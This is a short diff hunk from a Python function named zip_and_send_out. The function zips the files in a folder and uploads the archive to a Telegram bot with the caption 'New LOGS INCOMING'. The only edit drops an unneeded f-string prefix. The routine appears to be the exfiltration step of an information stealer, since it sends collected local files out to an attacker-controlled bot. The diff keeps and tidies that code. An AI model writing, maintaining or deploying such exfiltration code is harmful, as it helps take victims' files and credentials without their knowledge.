@@ -481,7 +481,7 @@ def zip_and_send_out():
                 zip_file.write(file_path, os.path.relpath(file_path, folder_path))
     with open(zip_path, 'rb') as zip_file:
         url = f'https://api.telegram.org/bot{token}/sendDocument'
-        msg = f"New LOGS INCOMING"
+        msg = "New LOGS INCOMING"
         files = {'document': zip_file}
         data = {'chat_id': chat_id, 'caption': f'{msg}'}
         response = requests.post(url, files=files, data=data)
